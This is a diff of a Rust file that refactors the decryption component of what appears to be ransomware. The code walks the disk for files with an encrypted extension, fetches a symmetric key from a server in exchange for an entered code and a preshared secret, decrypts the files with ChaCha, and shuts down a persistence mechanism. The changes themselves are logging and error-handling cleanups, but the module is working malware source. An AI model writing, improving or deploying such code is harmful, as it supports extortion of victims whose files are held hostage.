@@ -1,17 +1,23 @@
-use flume::Receiver;
-use log::{debug, error, info};
-use slint::ComponentHandle;
 use std::{
+    io,
     path::PathBuf,
-    sync::{Arc, mpsc},
-    thread,
+    sync::{
+        Arc,
+        mpsc::{self, SyncSender},
+    },
+    thread::{self, JoinHandle},
 };
-use zeroize::{Zeroize, Zeroizing};
+
+use anyhow::Context;
+use flume::{Receiver, bounded};
+use purecrypto::zeroize::{Zeroize, Zeroizing};
+use slint::{ComponentHandle, Weak};
+use tracing::{debug, error, info};
 
 use crate::{
     Main,
     client::{channel_capacity, recv_path},
-    comm::{ServerConn, get_sym_key},
+    comm::{ServerConn, fetch_sym_key},
     config,
     crypto::{aead_decrypt_file, parse_encrypted_file_name},
     persist::stop_persist,
@@ -22,14 +28,14 @@ use crate::{
 pub struct DecryptConfig {
     pub status: Status,
     pub conn: ServerConn,
-    pub preshared_secret: String,
+    pub preshared_secret: &'static str,
     pub encrypted_extension: Arc<str>,
     pub walk_threads: usize,
     pub decrypt_threads: usize,
     pub persist: bool,
 }
 
-fn set_ui_status(ui: &slint::Weak<Main>, text: &str, progress: Option<bool>) {
+fn set_ui_status(ui: &Weak<Main>, text: &str, progress: Option<bool>) {
     let text = text.to_string();
     let result = ui.upgrade_in_event_loop(move |handle| {
         handle.set_status_text(text.into());
@@ -37,26 +43,29 @@ fn set_ui_status(ui: &slint::Weak<Main>, text: &str, progress: Option<bool>) {
             handle.set_status_progress(progress);
         }
     });
-    if result.is_err() {
-        error!("Failed to upgrade UI handle");
+    if let Err(error) = result {
+        error!(error = ?error, "Failed to upgrade UI handle");
     }
 }
 
-pub fn spawn_decryption_handler(ui: &Main, config: DecryptConfig) -> mpsc::SyncSender<String> {
+pub fn spawn_decryption_handler(
+    ui: &Main,
+    config: DecryptConfig,
+) -> io::Result<SyncSender<String>> {
     let ui_handle = ui.as_weak();
     let (decrypt_tx, decrypt_rx) = mpsc::sync_channel(1);
 
-    thread_scope(config, ui_handle, decrypt_rx);
+    thread_scope(config, ui_handle, decrypt_rx)?;
 
-    decrypt_tx
+    Ok(decrypt_tx)
 }
 
 fn thread_scope(
     config: DecryptConfig,
-    ui_handle: slint::Weak<Main>,
+    ui_handle: Weak<Main>,
     decrypt_rx: mpsc::Receiver<String>,
-) {
-    thread::spawn(move || {
+) -> io::Result<JoinHandle<()>> {
+    thread::Builder::new().spawn(move || {
         let mut persistence_stopped = false;
         loop {
             let Ok(code): Result<String, _> = decrypt_rx.recv() else {
@@ -64,15 +73,15 @@ fn thread_scope(
                 return;
             };
 
-            let Ok(sym_key) = get_sym_key(
-                &config.conn,
-                &config.status,
-                &code,
-                &config.preshared_secret,
-            ) else {
-                set_ui_status(&ui_handle, "Code failed verification", Some(false));
-                continue;
-            };
+            let sym_key =
+                match fetch_sym_key(&config.conn, &config.status, &code, config.preshared_secret) {
+                    Ok(key) => key,
+                    Err(error) => {
+                        error!(error = ?error, "Symmetric key request failed");
+                        set_ui_status(&ui_handle, "Code failed verification", Some(false));
+                        continue;
+                    }
+                };
 
             info!("Starting decryption");
             set_ui_status(
@@ -82,25 +91,31 @@ fn thread_scope(
             );
 
             let aad: Arc<[u8]> = Arc::from(config.status.encryption_aad.as_bytes());
-            decrypt_files(
+            match decrypt_files(
                 sym_key,
                 &config.encrypted_extension,
                 config.walk_threads,
                 config.decrypt_threads,
                 &aad,
-            );
-
-            info!("Decryption complete");
-            set_ui_status(&ui_handle, "Decryption complete", Some(false));
+            ) {
+                Ok(()) => {
+                    info!("Decryption complete");
+                    set_ui_status(&ui_handle, "Decryption complete", Some(false));
+                }
+                Err(error) => {
+                    error!(error = ?error, "Failed to run decryption");
+                    set_ui_status(&ui_handle, "Decryption failed", Some(false));
+                }
+            }
 
             if config.persist && !persistence_stopped {
                 persistence_stopped = true;
                 if let Err(error) = stop_persist() {
-                    error!("Failed to end persistence: {error}");
+                    error!(error = ?error, "Failed to end persistence");
                 }
             }
         }
-    });
+    })
 }
 
 fn decrypt_files(
@@ -109,28 +124,34 @@ fn decrypt_files(
     walk_threads: usize,
     decrypt_threads: usize,
     aad: &Arc<[u8]>,
-) {
-    let (dec_walk_tx, dec_walk_rx) = flume::bounded(channel_capacity(decrypt_threads));
+) -> anyhow::Result<()> {
+    let (dec_walk_tx, dec_walk_rx) = bounded(channel_capacity(decrypt_threads));
     let mut thread_handles = Vec::new();
 
     let exts = [encrypted_extension.to_string()];
-    thread_handles.push(walk_with_exts(
-        dec_walk_tx.clone(),
-        Some(exts.as_slice()),
-        None,
-        walk_threads,
-        Some(config::MAX_ENCRYPT_FILE_BYTES.saturating_add(16)),
-    ));
+    thread_handles.push(
+        walk_with_exts(
+            dec_walk_tx.clone(),
+            Some(exts.as_slice()),
+            None,
+            walk_threads,
+            Some(config::MAX_ENCRYPT_FILE_BYTES.saturating_add(16)),
+        )
+        .context("failed to spawn decryption walk coordinator")?,
+    );
     drop(dec_walk_tx);
 
     let sym_key_arc = Arc::new(sym_key);
     for _ in 0..decrypt_threads {
-        thread_handles.push(decrypt_worker(
-            dec_walk_rx.clone(),
-            Arc::clone(&sym_key_arc),
-            Arc::clone(aad),
-            Arc::clone(encrypted_extension),
-        ));
+        thread_handles.push(
+            decrypt_worker(
+                dec_walk_rx.clone(),
+                Arc::clone(&sym_key_arc),
+                Arc::clone(aad),
+                Arc::clone(encrypted_extension),
+            )
+            .context("failed to spawn decryption worker")?,
+        );
     }
     drop(dec_walk_rx);
 
@@ -145,6 +166,7 @@ fn decrypt_files(
     } else {
         error!("Failed to clear decryption key: outstanding references");
     }
+    Ok(())
 }
 
 fn decrypt_worker(
@@ -152,23 +174,23 @@ fn decrypt_worker(
     key: Arc<Zeroizing<[u8; 32]>>,
     aad: Arc<[u8]>,
     expected_ext: Arc<str>,
-) -> thread::JoinHandle<()> {
-    thread::spawn(move || {
+) -> io::Result<JoinHandle<()>> {
+    thread::Builder::new().spawn(move || {
         loop {
             let Some(file_path) = recv_path(&receiver) else {
                 return;
             };
 
-            info!("Decrypting file: {}", file_path.display());
+            info!(path = %file_path.display(), "Decrypting file");
 
             let Some(file_name_osstr) = file_path.file_name() else {
-                error!("File path has invalid file name: {file_path:?}");
+                error!(path = %file_path.display(), "File path has invalid file name");
                 continue;
             };
             let Some(file_name) = file_name_osstr.to_str() else {
                 error!(
-                    "File name is not valid UTF-8: {}",
-                    file_name_osstr.display()
+                    file_name = %file_name_osstr.display(),
+                    "File name is not valid UTF-8"
                 );
                 continue;
             };
@@ -176,12 +198,12 @@ fn decrypt_worker(
             let Some((decrypted_file_name, full_nonce_bytes)) =
                 parse_encrypted_file_name(file_name, &expected_ext)
             else {
-                error!("File name does not match encrypted shape: {file_name}");
+                error!(file_name, "File name does not match encrypted shape");
                 continue;
             };
 
             let Some(parent_dir) = file_path.parent() else {
-                error!("File path has invalid parent path: {file_path:?}");
+                error!(path = %file_path.display(), "File path has invalid parent path");
                 continue;
             };
             let decrypted_file_path = parent_dir.join(decrypted_file_name);
@@ -195,10 +217,13 @@ fn decrypt_worker(
                 config::MAX_ENCRYPT_FILE_BYTES,
             ) {
                 Ok(()) => {
-                    debug!("Successfully applied ChaCha to data for decryption: {file_path:?}");
+                    debug!(
+                        path = %file_path.display(),
+                        "Successfully applied ChaCha to data for decryption"
+                    );
                 }
                 Err(error) => {
-                    error!("Failed to apply ChaCha to data for decryption: {error:?}");
+                    error!(error = ?error, "Failed to apply ChaCha to data for decryption");
                 }
             }
         }
